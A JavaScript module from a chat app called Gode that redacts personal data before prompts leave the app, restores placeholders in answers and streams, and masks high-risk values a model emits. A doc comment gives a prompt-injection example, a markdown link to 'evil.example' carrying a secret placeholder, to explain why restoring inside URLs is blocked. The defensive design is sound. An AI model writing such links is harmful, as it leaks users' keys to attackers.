"use strict";
// The redactor: finds personal data, swaps it for placeholders before anything leaves Gode, puts the
// real values back into answers (also while streaming), and masks high-risk data a model emits on
// its own. Built-in recognizers always run; Presidio adds NER when configured. Nothing in this file
// logs or transmits text: only counts and error codes are ever logged.

const { AppError } = require("../util");
const { detectBuiltin, resolveOverlaps, isCommonWord, isDateLike, escapeRegExp, HIGH_RISK_TYPES } = require("./patterns");
const { createPresidioClient, PresidioError } = require("./presidio");

const LABELS = Object.freeze(["PERSON", "EMAIL", "PHONE", "CARD", "IBAN", "SSN", "IP", "LOCATION", "PASSPORT", "LICENSE", "BANK_ACCOUNT", "CRYPTO", "SECRET"]);
const HIGH_RISK = new Set(HIGH_RISK_TYPES);

// Media models cannot round-trip placeholders, so media prompts get a neutral phrase instead.
// [first distinct value, every further distinct value of the same type]
const GENERIC_PHRASES = Object.freeze({
  PERSON: ["a person", "another person"],
  EMAIL: ["an email address", "another email address"],
  PHONE: ["a phone number", "another phone number"],
  CARD: ["a card number", "another card number"],
  IBAN: ["a bank account number", "another bank account number"],
  SSN: ["an ID number", "another ID number"],
  IP: ["an IP address", "another IP address"],
  LOCATION: ["a place", "another place"],
  PASSPORT: ["a passport number", "another passport number"],
  LICENSE: ["a license number", "another license number"],
  BANK_ACCOUNT: ["a bank account number", "another bank account number"],
  CRYPTO: ["a crypto wallet address", "another crypto wallet address"],
  SECRET: ["a secret", "another secret"],
});
const GENERIC_FALLBACK = ["a private detail", "another private detail"];

// ---------------------------------------------------------------------------------------------
// Placeholder syntax. One regex serves restore() and look-alike detection, so "what restore would
// replace" and "what we protect in user text" can never drift apart. Tolerates case changes, a
// missing bracket on either side, and markdown escapes ("\[PERSON\_1\]").
// ---------------------------------------------------------------------------------------------
const LABEL_ALT = [...LABELS]
  .sort((a, b) => b.length - a.length)
  .map((l) => l.replace(/_/g, String.raw`\\?_`))
  .join("|");
const PLACEHOLDER_SOURCE = String.raw`(?:\\?\[)?(?<![A-Za-z0-9_])(${LABEL_ALT})\\?_(\d{1,6})(?![A-Za-z0-9_])(?:\\?\])?`;
const PLACEHOLDER_KEY_RE = /^\[([A-Z][A-Z_]*)_(\d+)\]$/;

function placeholderRegex() {
  return new RegExp(PLACEHOLDER_SOURCE, "gi");
}

function canonicalType(raw) {
  return raw.replace(/\\/g, "").toUpperCase();
}

function placeholderKey(rawType, num) {
  return `[${canonicalType(rawType)}_${num}]`;
}

// ---------------------------------------------------------------------------------------------
// Placeholder map: { v: 1, byValue: { "<TYPE>\0<normalized>": "[TYPE_n]" },
//                    byPlaceholder: { "[TYPE_n]": "<original>" }, counters: { TYPE: n } }
// ---------------------------------------------------------------------------------------------

function emptyMap() {
  return { v: 1, byValue: {}, byPlaceholder: {}, counters: {} };
}

const ownEntries = (obj) => (obj && typeof obj === "object" && !Array.isArray(obj) ? Object.entries(obj) : []);

/**
 * Defensive copy of a stored map. Keys are validated (the map comes back from storage as JSON, and
 * "__proto__" must never become a prototype), dangling entries are dropped, and counters are raised
 * to the highest index in use so a placeholder is never issued twice.
 */
function cloneMap(map) {
  const out = emptyMap();
  if (map === null || map === undefined) return out;
  if (typeof map !== "object" || Array.isArray(map)) throw new TypeError("redact: placeholder map must be an object or null");
  for (const [k, v] of ownEntries(map.byPlaceholder)) {
    if (PLACEHOLDER_KEY_RE.test(k) && typeof v === "string") out.byPlaceholder[k] = v;
  }
  for (const [k, v] of ownEntries(map.byValue)) {
    if (k.includes("\u0000") && typeof v === "string" && Object.hasOwn(out.byPlaceholder, v)) out.byValue[k] = v;
  }
  for (const [k, v] of ownEntries(map.counters)) {
    if (/^[A-Z][A-Z_]*$/.test(k) && Number.isInteger(v) && v >= 0) out.counters[k] = v;
  }
  for (const k of Object.keys(out.byPlaceholder)) {
    const [, type, n] = PLACEHOLDER_KEY_RE.exec(k);
    out.counters[type] = Math.max(out.counters[type] || 0, Number(n));
  }
  return out;
}

/** Canonical form used to decide "same real value" (map key). */
function normalizeValue(type, value) {
  const v = String(value ?? "").normalize("NFKC").trim();
  switch (type) {
    case "EMAIL":
    case "IP":
      return v.toLowerCase();
    case "PHONE": {
      let d = v.replace(/\D/g, "");
      if (/^\s*00/.test(v)) d = d.slice(2); // 0044… == +44…
      if (d.length === 11 && d.startsWith("1")) d = d.slice(1); // +1 555… == 555…
      return d;
    }
    case "CARD":
    case "SSN":
      return v.replace(/\D/g, "");
    case "IBAN":
    case "PASSPORT":
    case "LICENSE":
    case "BANK_ACCOUNT":
      return v.replace(/[^A-Za-z0-9]/g, "").toUpperCase();
    case "SECRET":
    case "CRYPTO":
      return v; // case-sensitive by nature
    default:
      // Names, places: "Ada  Lovelace", "ada lovelace", "Ada Lovelace." are one person.
      return v.replace(/[’‘]/g, "'").replace(/\s+/g, " ").replace(/[.,;:!?]+$/, "").toLowerCase();
  }
}

function assignPlaceholder(state, type, value) {
  const key = `${type}\u0000${normalizeValue(type, value)}`;
  if (Object.hasOwn(state.byValue, key)) return state.byValue[key];
  let n = state.counters[type] || 0;
  let placeholder;
  do {
    n += 1;
    placeholder = `[${type}_${n}]`;
  } while (Object.hasOwn(state.byPlaceholder, placeholder));
  state.counters[type] = n;
  state.byValue[key] = placeholder;
  state.byPlaceholder[placeholder] = value;
  return placeholder;
}

// ---------------------------------------------------------------------------------------------
// Extra entities for redactMessages: values already in the map, and placeholder look-alikes.
// ---------------------------------------------------------------------------------------------

const WORD_START = /^[\p{L}\p{N}_]/u;
const WORD_END = /[\p{L}\p{N}_]$/u;

/** Regex source for one literal value, word-bounded where the value starts/ends with a word char. */
function valueSource(v) {
  const body = escapeRegExp(v).replace(/\s+/g, String.raw`\s+`);
  const pre = WORD_START.test(v) ? String.raw`(?<![\p{L}\p{N}_])` : "";
  const post = WORD_END.test(v) ? String.raw`(?![\p{L}\p{N}_])` : "";
  return pre + body + post;
}

/**
 * Matchers for values the conversation already mapped. This is what keeps a name redacted in later
 * turns (and in restored assistant messages) where no trigger phrase like "my name is" appears.
 * Values are grouped into one alternation per (type, score, case mode): a long conversation can
 * hold hundreds of values and every history message is scanned on every turn.
 */
function knownValueMatchers(state) {
  const groups = new Map();
  const add = (type, value, score, caseSensitive) => {
    const id = `${type}|${score}|${caseSensitive}`;
    if (!groups.has(id)) groups.set(id, { type, score, caseSensitive, values: new Set() });
    groups.get(id).values.add(value.trim());
  };
  for (const [key, placeholder] of Object.entries(state.byValue)) {
    const type = key.slice(0, key.indexOf("\u0000"));
    const value = state.byPlaceholder[placeholder];
    if (typeof value !== "string") continue;
    const v = value.trim();
    if (!v || placeholderRegex().test(v)) continue; // look-alikes are found by their own pass
    if (v.length < 3 && !/\d/.test(v)) continue; // "Al", "Jo": too short to search blindly
    const textual = type === "PERSON" || type === "LOCATION";
    const single = !/\s/.test(v);
    const caseSensitive = type === "SECRET" || type === "CRYPTO" || (textual && single && isCommonWord(v));
    add(type, v, 0.95, caseSensitive);
    if (type === "PERSON" && !single) {
      // "Ada Lovelace" known → a later bare "Ada" is the same person.
      for (const tok of v.split(/\s+/)) {
        if (tok.length >= 3 && /^\p{Lu}/u.test(tok) && !isCommonWord(tok) && !tok.endsWith(".")) add(type, tok, 0.6, true);
      }
    }
  }
  return [...groups.values()].map((g) => {
    // Longest first, so "Ada Lovelace" wins over "Ada" at the same position.
    const alts = [...g.values].sort((a, b) => b.length - a.length).map(valueSource);
    return { type: g.type, score: g.score, re: new RegExp(`(?:${alts.join("|")})`, g.caseSensitive ? "gu" : "giu") };
  });
}

/** "[PERSON_1]" typed by the user is text, not one of our placeholders: it gets mapped like a value. */
function lookalikeEntities(text) {
  const out = [];
  for (const m of text.matchAll(placeholderRegex())) {
    out.push({ type: canonicalType(m[1]), start: m.index, end: m.index + m[0].length, score: 1, literal: true });
  }
  return out;
}

function collectEntities(text, fresh, matchers, withLookalikes) {
  const all = [...fresh];
  if (withLookalikes) all.push(...lookalikeEntities(text));
  for (const m of matchers) {
    for (const x of text.matchAll(m.re)) all.push({ type: m.type, start: x.index, end: x.index + x[0].length, score: m.score, known: true });
  }
  return resolveOverlaps(all, text);
}

function applyPlaceholders(text, entities, state, counts) {
  let out = "";
  let last = 0;
  for (const e of entities) {
    out += text.slice(last, e.start) + assignPlaceholder(state, e.type, e.value);
    last = e.end;
    if (!e.literal) counts[e.type] = (counts[e.type] || 0) + 1;
  }
  return out + text.slice(last);
}

function applyGeneric(text, entities, seenByType, counts) {
  let out = "";
  let last = 0;
  for (const e of entities) {
    if (e.literal) continue; // a typed "[PERSON_1]" is not personal data; leave it
    if (!seenByType.has(e.type)) seenByType.set(e.type, new Map());
    const seen = seenByType.get(e.type);
    const norm = normalizeValue(e.type, e.value);
    const phrases = GENERIC_PHRASES[e.type] || GENERIC_FALLBACK;
    if (!seen.has(norm)) seen.set(norm, seen.size === 0 ? phrases[0] : phrases[1]);
    out += text.slice(last, e.start) + seen.get(norm);
    last = e.end;
    counts[e.type] = (counts[e.type] || 0) + 1;
  }
  return out + text.slice(last);
}

/**
 * Placeholders -> neutral phrases, for media prompts the classifier wrote from redacted text
 * ("now make a video of [PERSON_1]" -> "now make a video of a person"). Media models cannot
 * round-trip placeholders. Every placeholder form restore() would recognise is replaced, whether
 * or not it is in a map: the first distinct one of a type gets the first phrase ("a person"),
 * every further distinct one the second ("another person"), the same one always the same phrase.
 */
function genericizePlaceholders(text) {
  if (typeof text !== "string") return text === null || text === undefined ? "" : String(text);
  const seenByType = new Map();
  return text.replace(placeholderRegex(), (match, rawType, num) => {
    const type = canonicalType(rawType);
    const key = placeholderKey(rawType, num);
    if (!seenByType.has(type)) seenByType.set(type, new Map());
    const seen = seenByType.get(type);
    const phrases = GENERIC_PHRASES[type] || GENERIC_FALLBACK;
    if (!seen.has(key)) seen.set(key, seen.size === 0 ? phrases[0] : phrases[1]);
    return seen.get(key);
  });
}

// ---------------------------------------------------------------------------------------------
// Restore
// ---------------------------------------------------------------------------------------------

const SPACE = /\s/;
const BARE_URL_START = /(?:https?:\/\/|mailto:|(?:^|[^A-Za-z0-9.-])www\.)$/i;
const AUTOLINK_START = /<[A-Za-z][A-Za-z0-9+.-]{1,31}:$/;

/**
 * Tracks whether the output so far ends inside a URL, character by character, so restore() and
 * the stream restorer decide the same way whatever the chunk boundaries. Placeholders inside a URL
 * are never restored: a model following injected instructions could otherwise write
 * "[Open the dashboard](https://evil.example/?k=[SECRET_1])" and Gode would fill in the real key
 * behind a link the user may click.
 * URL contexts, generous on purpose (not restoring is the safe side):
 * - a bare run from "http(s)://", "mailto:" or "www." to the next whitespace;
 * - a markdown link target "](...)", to its closing ")" (nested parentheses counted, as CommonMark
 *   does) or whitespace;
 * - an autolink "<scheme:...>", to ">" or whitespace.
 * Only those end a context. Quotes, backticks and "<" do not: the chat's markdown renderer
 * (public/app.js parseInline) keeps them inside link targets and bare URLs, so ending there would
 * let "https://evil.example/?k='[SECRET_1]" restore the key into the href.
 */
function createUrlScanner() {
  let recent = ""; // the current run's last characters, enough to spot an opener
  let bare = false;
  let bareIn = null; // 'target' | 'auto' | null: what the bare run started inside, so closing that ends it
  let depth = 0; // parentheses open in a link target; 0 = not in one
  let auto = false;
  return {
    advance(s) {
      for (let i = 0; i < s.length; i++) {
        const ch = s[i];
        if (SPACE.test(ch)) {
          bare = auto = false;
          bareIn = null;
          depth = 0;
          recent = "";
          continue;
        }
        if (ch === "(") {
          if (depth) depth += 1;
          else if (recent.endsWith("]")) depth = 1;
        } else if (ch === ")" && depth) {
          depth -= 1;
          if (!depth && bareIn === "target") bare = false;
        } else if (ch === ">" && auto) {
          auto = false;
          if (bareIn === "auto") bare = false;
        }
        recent = recent.length >= 40 ? recent.slice(-39) + ch : recent + ch;
        if (ch === ":" && !auto && AUTOLINK_START.test(recent)) auto = true;
        if (!bare && (ch === "/" || ch === ":" || ch === ".") && BARE_URL_START.test(recent)) {
          bare = true;
          bareIn = depth ? "target" : auto ? "auto" : null;
        }
      }
    },
    get inUrl() {
      return bare || depth > 0 || auto;
    },
  };
}

/**
 * Replace placeholders that exist in `byPlaceholder`, except inside URLs (createUrlScanner).
 * Returns the restored text from `from` on: text before `from` is context only (the regex's word
 * boundary), already fed to `scanner`; a match starting there is left as it is.
 * The scanner reads the output (restored values included), since that is what gets rendered: a
 * restored value that itself starts a URL keeps the next placeholder out of it.
 */
function restoreText(text, byPlaceholder, { from = 0, scanner = createUrlScanner() } = {}) {
  let out = "";
  let pos = from;
  for (const m of text.matchAll(placeholderRegex())) {
    const start = m.index;
    const end = start + m[0].length;
    if (end <= from) continue;
    if (start < from) {
      scanner.advance(text.slice(pos, end));
      out += text.slice(pos, end);
      pos = end;
      continue;
    }
    const before = text.slice(pos, start);
    scanner.advance(before);
    const key = placeholderKey(m[1], m[2]);
    const replacement = Object.hasOwn(byPlaceholder, key) && !scanner.inUrl ? byPlaceholder[key] : m[0];
    out += before + replacement;
    scanner.advance(replacement);
    pos = end;
  }
  const rest = text.slice(pos);
  scanner.advance(rest);
  return out + rest;
}

function placeholdersOf(map) {
  const src = map && typeof map === "object" ? map.byPlaceholder : null;
  const out = {};
  for (const [k, v] of ownEntries(src)) if (PLACEHOLDER_KEY_RE.test(k) && typeof v === "string") out[k] = v;
  return out;
}

/**
 * Placeholders → real values. Unknown placeholders, placeholders inside URLs (link targets,
 * autolinks, bare http(s) URLs) and everything else stay as they are.
 */
function restore(text, map) {
  if (typeof text !== "string") return text === null || text === undefined ? "" : String(text);
  const byPlaceholder = placeholdersOf(map);
  if (!text || !Object.keys(byPlaceholder).length) return text;
  return restoreText(text, byPlaceholder);
}

const ASCII_WORD = /[A-Za-z0-9_]/;

/**
 * Could `s` (a buffer suffix) still turn into a placeholder from the map once more text arrives?
 * `prev` is the character before `s`, needed for the word boundary a bare "PERSON_1" requires.
 */
function couldBePlaceholder(s, prev, bodies) {
  let rest = s;
  let bracket = false;
  if (rest.startsWith("\\[")) {
    rest = rest.slice(2);
    bracket = true;
  } else if (rest.startsWith("[")) {
    rest = rest.slice(1);
    bracket = true;
  } else if (rest === "\\") {
    return true; // may become "\["
  }
  if (!bracket && prev && ASCII_WORD.test(prev)) return false;
  if (rest === "") return bracket;
  let core = rest.endsWith("\\") ? rest.slice(0, -1) : rest; // an escape for "_" or "]" may follow
  if (core.includes("]")) return false; // closed: nothing later can change this match
  core = core.replace(/\\_/g, "_").toUpperCase();
  if (!/^[A-Z0-9_]*$/.test(core)) return false;
  return bodies.some((b) => b.startsWith(core));
}

/**
 * Streaming restore. push() returns only text that can no longer be part of a placeholder; the
 * shortest tail that still could ("[", "[PER", "PERSON_1") is held until the next chunk or flush().
 * Concatenated output always equals restore(fullText, map), whatever the chunk boundaries
 * (placeholders inside URLs included: the URL scanner reads the same output in the same order).
 *
 * opts.maskHighRisk: also mask high-risk data the model produced on its own while streaming (see
 * createHighRiskMasker), so a regurgitated card number is never on screen even for a moment.
 * opts.ownMap: the map whose values are the user's own (never masked); defaults to `map`. Pass it
 * when `map` is null because the model got the real text (self-hosted): the user's own values are
 * still theirs.
 */
function createStreamRestorer(map, { maskHighRisk = false, ownMap = map } = {}) {
  const restorer = createPlainStreamRestorer(map);
  if (!maskHighRisk) return restorer;
  const masker = createHighRiskMasker(ownMap);
  return {
    push: (chunk) => masker.push(restorer.push(chunk)),
    flush: () => masker.push(restorer.flush()) + masker.flush(),
    /** { [type]: n } masked so far. */
    masked: () => masker.masked(),
  };
}

function createPlainStreamRestorer(map) {
  const byPlaceholder = placeholdersOf(map);
  const bodies = Object.keys(byPlaceholder).map((k) => k.slice(1, -1));
  if (!bodies.length) {
    return { push: (chunk) => (chunk === null || chunk === undefined ? "" : String(chunk)), flush: () => "" };
  }
  // Longest form: "\[" + body with every "_" escaped + "\]"
  const maxHold = Math.max(...bodies.map((b) => b.length + (b.match(/_/g) || []).length)) + 4;
  let pending = "";
  let prev = ""; // last raw character already emitted: context for word boundaries
  const scanner = createUrlScanner(); // has read everything emitted so far

  function holdStart(buf) {
    for (let i = Math.max(0, buf.length - maxHold); i < buf.length; i++) {
      if (couldBePlaceholder(buf.slice(i), i > 0 ? buf[i - 1] : prev, bodies)) return i;
    }
    return buf.length;
  }

  function emit(segment) {
    if (!segment) return "";
    const out = restoreText(prev + segment, byPlaceholder, { from: prev.length, scanner });
    prev = segment[segment.length - 1];
    return out;
  }

  return {
    push(chunk) {
      if (chunk === null || chunk === undefined || chunk === "") return "";
      pending += String(chunk);
      const cut = holdStart(pending);
      const segment = pending.slice(0, cut);
      pending = pending.slice(cut);
      return emit(segment);
    },
    flush() {
      const segment = pending;
      pending = "";
      return emit(segment);
    },
  };
}

// Incremental high-risk masking (createHighRiskMasker). The detectors need the whole value and a
// little context before it, so the masker holds back the trailing word (a key, a password after
// "password:") and, before it, any run of short digit groups a card/IBAN/SSN could still grow from
// ("4111 1111 "). Detection runs on the last MASK_LOOKBACK characters already shown (keywords like
// "SSN" or "password:" live there) plus everything held, and a value found across the cut stays
// held whole: the run and size limits below may otherwise cut through a complete card.
const MASK_LOOKBACK = 96;
const MASK_MAX_GROUP_RUN = 64; // longest spaced number kept back: an IBAN is 34 chars + 8 spaces
// A single "word" longer than this is released anyway, MASK_MAX_HOLD / 2 at a time so the detector
// runs once per 2 KB of it rather than once per chunk; the final filter masks it if it is a value.
const MASK_MAX_HOLD = 4096;
// A word a spaced card/IBAN/SSN may consist of: short with a digit, or an IBAN's letter group ("NWBK").
const GROUP_WORD = /^(?:(?=[A-Za-z0-9-]*\d)[A-Za-z0-9-]{1,8}|[A-Z]{4})$/;

/**
 * Masks high-risk values that are not the user's own in a stream of (restored) text, like
 * filterResponse does on the final text, without ever showing them first. What it cannot see whole
 * (a multi-line private key block, a token over MASK_MAX_HOLD) passes through for the final
 * filterResponse to replace, so the final filter stays the safety net.
 */
function createHighRiskMasker(ownMap) {
  const isOwn = ownValueIndex(ownMap);
  const masked = {};
  let held = "";
  let lookback = "";
  // held[0, wsEnd) ends with the last whitespace in held (0: none). Kept up to date per push so a
  // long word does not cost a rescan of everything held on every chunk.
  let wsEnd = 0;

  /** Index in `held` before which text can be released. */
  function cutPoint() {
    // The trailing word (after the last whitespace) may still grow.
    const tail = wsEnd;
    // Digit groups right before it, one space apart, may be the start of a spaced number. Only the
    // last MASK_MAX_GROUP_RUN characters before the tail can belong to such a run.
    const floor = Math.max(0, tail - MASK_MAX_GROUP_RUN - 1);
    let start = tail;
    while (start >= 2 && held[start - 1] === " ") {
      let wordStart = -1;
      for (let i = start - 2; i >= floor; i--) {
        if (/\s/.test(held[i])) {
          wordStart = i + 1;
          break;
        }
      }
      if (wordStart === -1 && floor === 0) wordStart = 0;
      if (wordStart === -1 || tail - wordStart > MASK_MAX_GROUP_RUN) break;
      const word = held.slice(wordStart, start - 1);
      if (!GROUP_WORD.test(word)) {
        // A first group glued to punctuation ("IBAN:GB82", "no.4916"): the run may start after the
        // punctuation, so that part stays held too. Released, the value would begin in text already
        // shown and be left for the final filter, i.e. on screen until the end of the answer.
        const glued = /[A-Za-z0-9-]+$/.exec(word);
        if (glued && glued.index > 0 && GROUP_WORD.test(glued[0])) start = wordStart + glued.index;
        break;
      }
      start = wordStart;
    }
    return held.length - start > MASK_MAX_HOLD ? held.length - MASK_MAX_HOLD / 2 : start;
  }

  /** Release held[0, cut) (all of it when `final`), masking the values wholly inside it. */
  function release(cut, final) {
    if (!cut) return "";
    const base = lookback.length;
    const ctx = lookback + held;
    const hits = highRiskHits(ctx, isOwn);
    if (!final) {
      // Hits are sorted and never overlap, so at most one spans the cut.
      const across = hits.find((e) => e.start >= base && e.start - base < cut && e.end - base > cut);
      if (across && across.end - across.start <= MASK_MAX_HOLD) cut = across.start - base;
      if (!cut) return "";
    }
    let out = "";
    let last = base;
    for (const e of hits) {
      // A value that began in text already shown is left for the final filter, which masks it whole.
      if (e.start < base) continue;
      if (e.end - base > cut) break;
      out += `${ctx.slice(last, e.start)}[redacted ${e.type}]`;
      last = e.end;
      masked[e.type] = (masked[e.type] || 0) + 1;
    }
    out += ctx.slice(last, base + cut);
    held = held.slice(cut);
    wsEnd = Math.max(0, wsEnd - cut);
    lookback = (lookback + out).slice(-MASK_LOOKBACK);
    return out;
  }

  return {
    push(text) {
      if (!text) return "";
      const from = held.length;
      held += text;
      for (let i = held.length - 1; i >= from; i--) {
        if (/\s/.test(held[i])) {
          wsEnd = i + 1;
          break;
        }
      }
      return release(cutPoint(), false);
    },
    flush: () => release(held.length, true),
    masked: () => ({ ...masked }),
  };
}

// ---------------------------------------------------------------------------------------------
// Response filter and sensitivity signal
// ---------------------------------------------------------------------------------------------

const looseForm = (v) => String(v).replace(/[^A-Za-z0-9]/g, "").toUpperCase();

function ownValueIndex(map) {
  const keys = new Set();
  const loose = new Set();
  const byPlaceholder = placeholdersOf(map);
  for (const [key, placeholder] of ownEntries(map && map.byValue)) {
    keys.add(key);
    const original = byPlaceholder[placeholder];
    const lf = typeof original === "string" ? looseForm(original) : "";
    if (lf) loose.add(lf);
  }
  return (type, value) => keys.has(`${type}\u0000${normalizeValue(type, value)}`) || loose.has(looseForm(value));
}

/**
 * Mask high-risk data that appears in model output but is not one of the user's own values (models
 * can regurgitate card numbers or keys from training data). Synchronous: built-in recognizers only.
 */
// Public test/documentation values (Stripe and network test cards, AWS docs keys). Code answers
// legitimately contain them; they identify no one.
const PUBLIC_TEST_CARDS = new Set([
  "4242424242424242", "4111111111111111", "4000056655665556", "5555555555554444", "2223003122003222",
  "5200828282828210", "5105105105105100", "378282246310005", "371449635398431", "6011111111111117",
  "6011000990139424", "3056930009020004", "36227206271667", "3566002020360505", "6200000000000005",
  "4012888888881881", "4222222222222",
]);

function isPublicExample(type, value) {
  if (type === "CARD") return PUBLIC_TEST_CARDS.has(value.replace(/\D/g, ""));
  if (type === "SECRET") return /EXAMPLE/i.test(value);
  return false;
}

/** High-risk entities in `text` that are neither the user's own nor public examples. */
function highRiskHits(text, isOwn) {
  return detectBuiltin(text).filter((e) => HIGH_RISK.has(e.type) && !isOwn(e.type, e.value) && !isPublicExample(e.type, e.value));
}

function filterResponse(text, map) {
  const masked = {};
  if (typeof text !== "string" || !text) return { text: typeof text === "string" ? text : "", masked };
  const hits = highRiskHits(text, ownValueIndex(map));
  if (!hits.length) return { text, masked };
  let out = "";
  let last = 0;
  for (const e of hits) {
    out += `${text.slice(last, e.start)}[redacted ${e.type}]`;
    last = e.end;
    masked[e.type] = (masked[e.type] || 0) + 1;
  }
  return { text: out + text.slice(last), masked };
}

/** True when redaction counts include a high-risk type: a privacy signal for the router. */
function isSensitive(counts) {
  if (!counts || typeof counts !== "object") return false;
  return HIGH_RISK_TYPES.some((t) => Number(counts[t]) > 0);
}

// ---------------------------------------------------------------------------------------------
// Redactor
// ---------------------------------------------------------------------------------------------

// Presidio serves one request at a time (gunicorn 1 worker / the shim's lock). Firing 30 history
// messages at once would make the last ones wait past their timeout and trip the fallback.
const ANALYZE_CONCURRENCY = 4;

async function mapLimit(items, limit, fn) {
  const out = new Array(items.length);
  let next = 0;
  let failed = false;
  const worker = async () => {
    // After one failure the call is lost anyway: stop starting new work (and new Presidio calls).
    while (next < items.length && !failed) {
      const i = next++;
      try {
        out[i] = await fn(items[i], i);
      } catch (err) {
        failed = true;
        throw err;
      }
    }
  };
  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, worker));
  return out;
}

/** NER sanity checks: spaCy happily tags "Thanks" or a date as an entity. */
function plausibleExternal(e) {
  if (e.type === "PERSON" || e.type === "LOCATION") {
    if (e.value.length < 2 || !/\p{L}/u.test(e.value)) return false;
    if (!/\s/.test(e.value) && isCommonWord(e.value)) return false;
    if (placeholderRegex().test(e.value)) return false;
  }
  if (e.type === "PHONE" && isDateLike(e.value.trim())) return false;
  return true;
}

const UNAVAILABLE_MESSAGE = "The privacy filter is unavailable right now, so nothing was sent. Try again in a minute.";

/** The error redactMessages rejects with while Presidio is required (fail mode 'closed') and down. */
function redactionUnavailable() {
  return new AppError(503, "redaction_unavailable", UNAVAILABLE_MESSAGE);
}

/**
 * @param {object} config full app config (uses config.privacy)
 * @param {object} [opts] { fetch, logger, presidioRetryMs, presidioTimeoutMs, presidioRemindMs } — injectable for tests
 */
function createRedactor(config, opts = {}) {
  const privacy = (config && config.privacy) || {};
  const logger = opts.logger || console;
  // config.privacy.presidioFailMode (PRESIDIO_FAIL_MODE): with a Presidio URL set, 'closed' (the
  // default, also for hand-built configs) refuses to redact without it; 'open' carries on with the
  // built-in recognizers.
  const failClosed = privacy.presidioFailMode !== "open";
  // While Presidio is failing, skip it for a while instead of adding a timeout to every request
  // (a circuit breaker). Fail-closed refuses every prompt meanwhile, so it probes again sooner.
  const retryMs = Number.isFinite(opts.presidioRetryMs) ? opts.presidioRetryMs : failClosed ? 10_000 : 30_000;
  // An outage is logged when it starts, again every presidioRemindMs while it lasts, and at the end.
  const remindMs = Number.isFinite(opts.presidioRemindMs) ? opts.presidioRemindMs : 5 * 60_000;
  const presidio = privacy.presidioUrl
    ? createPresidioClient({
        url: privacy.presidioUrl,
        language: privacy.presidioLanguage || "en",
        scoreThreshold: Number.isFinite(privacy.presidioScoreThreshold) ? privacy.presidioScoreThreshold : 0.5,
        timeoutMs: Number.isFinite(opts.presidioTimeoutMs) ? opts.presidioTimeoutMs : 1500,
        // config.privacy.presidioEntities (PRESIDIO_ENTITIES); empty = the analyzer's default set.
        entities: Array.isArray(privacy.presidioEntities) && privacy.presidioEntities.length ? privacy.presidioEntities : undefined,
        fetch: opts.fetch,
      })
    : null;

  // 'off' (no URL) | 'unknown' (not used yet) | 'up' | 'down'
  let state = presidio ? "unknown" : "off";
  let downSince = 0;
  let retryAt = 0;
  let lastReminder = 0;
  let skipped = 0; // analyses done without Presidio (open) or refused (closed) in this outage
  const what = failClosed ? "refused" : "redacted with built-in recognizers only";

  /** Presidio unusable for this text: refuse (closed) or carry on with the built-ins (open). */
  function withoutPresidio() {
    skipped += 1;
    const now = Date.now();
    if (now - lastReminder >= remindMs) {
      lastReminder = now;
      const minutes = Math.max(1, Math.round((now - downSince) / 60_000));
      logger.warn?.(`[redact] Presidio analyzer still unavailable after ${minutes} min; ${skipped} texts ${what} so far`);
    }
    if (failClosed) throw redactionUnavailable();
    return [];
  }

  async function presidioEntities(text) {
    if (!presidio || !text.trim()) return [];
    if (state === "down" && Date.now() < retryAt) return withoutPresidio();
    try {
      const found = await presidio.analyze(text);
      if (state === "down") {
        const seconds = Math.round((Date.now() - downSince) / 1000);
        logger.info?.(`[redact] Presidio analyzer reachable again after ${seconds} s; ${skipped} texts ${what} meanwhile`);
      }
      state = "up";
      return found.filter(plausibleExternal);
    } catch (err) {
      if (state !== "down") {
        // err.message of a PresidioError is built by us and never contains text.
        const why = err instanceof PresidioError ? err.message : err?.name || "error";
        const then = failClosed ? "refusing prompts until it is back (PRESIDIO_FAIL_MODE=closed)" : "using built-in recognizers only";
        logger.warn?.(`[redact] Presidio analyzer unavailable (${why}); ${then}`);
        state = "down";
        downSince = Date.now();
        lastReminder = downSince;
        skipped = 0;
      }
      retryAt = Date.now() + retryMs;
      return withoutPresidio();
    }
  }

  async function analyze(text) {
    if (typeof text !== "string" || !text) return [];
    const builtin = detectBuiltin(text);
    const external = await presidioEntities(text);
    return external.length ? resolveOverlaps([...builtin, ...external], text) : builtin;
  }

  async function redactMessages(messages, map, { mode = "placeholder" } = {}) {
    if (!Array.isArray(messages)) throw new TypeError("redact: messages must be an array");
    if (mode !== "placeholder" && mode !== "generic") throw new TypeError(`redact: unknown mode "${mode}"`);
    const state = cloneMap(map);
    const counts = {};
    const texts = messages.map((m) => (m && typeof m.content === "string" ? m.content : ""));
    const fresh = await mapLimit(texts, ANALYZE_CONCURRENCY, (t) => analyze(t));
    const placeholder = mode === "placeholder";

    if (placeholder) {
      // Pass 1: register what this call detects, in order of appearance, so a name first introduced
      // in message 5 is also caught in message 2 (and numbering follows the conversation).
      const initial = knownValueMatchers(state);
      texts.forEach((t, i) => {
        if (!t) return;
        for (const e of collectEntities(t, fresh[i], initial, true)) assignPlaceholder(state, e.type, e.value);
      });
    }

    // Pass 2: rewrite every message with the complete set of known values.
    const matchers = knownValueMatchers(state);
    const seenGeneric = new Map();
    const out = messages.map((m, i) => {
      if (!texts[i]) return m && typeof m === "object" ? { ...m } : m;
      const entities = collectEntities(texts[i], fresh[i], matchers, placeholder);
      const content = placeholder ? applyPlaceholders(texts[i], entities, state, counts) : applyGeneric(texts[i], entities, seenGeneric, counts);
      return { ...m, content };
    });
    return { messages: out, map: state, counts };
  }

  return {
    analyze,
    redactMessages,
    restore,
    createStreamRestorer,
    filterResponse,
    isSensitive,
    genericizePlaceholders,
    /** Whether a Presidio URL is configured (not whether it is up): see presidioStatus(). */
    presidioEnabled: Boolean(presidio),
    /**
     * Live check of the configured analyzer; false when none is configured. A healthy answer during
     * an outage lets the next prompt try Presidio again at once instead of waiting out the breaker.
     */
    presidioHealth: async () => {
      if (!presidio) return false;
      const ok = await presidio.health();
      if (ok && state === "down") retryAt = 0;
      return ok;
    },
    /**
     * What redaction can promise right now, without a network call (for status pages and the
     * privacy page: say "Presidio" only while state is 'up').
     * @returns {{ enabled: boolean, state: 'off'|'unknown'|'up'|'down', failMode: 'closed'|'open', downSince: number|null }}
     */
    presidioStatus: () => ({
      enabled: Boolean(presidio),
      state,
      failMode: failClosed ? "closed" : "open",
      downSince: state === "down" ? downSince : null,
    }),
  };
}

module.exports = {
  createRedactor,
  restore,
  createStreamRestorer,
  filterResponse,
  isSensitive,
  genericizePlaceholders,
  normalizeValue,
  emptyMap,
  cloneMap,
  LABELS,
  HIGH_RISK_TYPES,
  GENERIC_PHRASES,
};
